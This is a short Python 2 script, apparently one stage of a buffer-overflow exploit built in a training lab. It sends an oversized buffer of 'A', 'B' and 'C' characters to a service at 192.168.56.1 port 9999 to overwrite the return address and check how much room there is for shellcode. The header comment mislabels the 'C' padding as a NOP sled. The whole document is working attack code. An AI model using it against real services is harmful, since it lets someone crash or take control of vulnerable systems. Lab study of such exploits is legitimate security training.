#Stretching systems like spandex | NOP sled Padding with 522 C's

import socket
import sys
from time import sleep

buffer = 'A' * 524 + 'B' * 4  + 'C' * 522 

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.56.1',9999))
  s.recv(1024)
  
  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()
  
except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
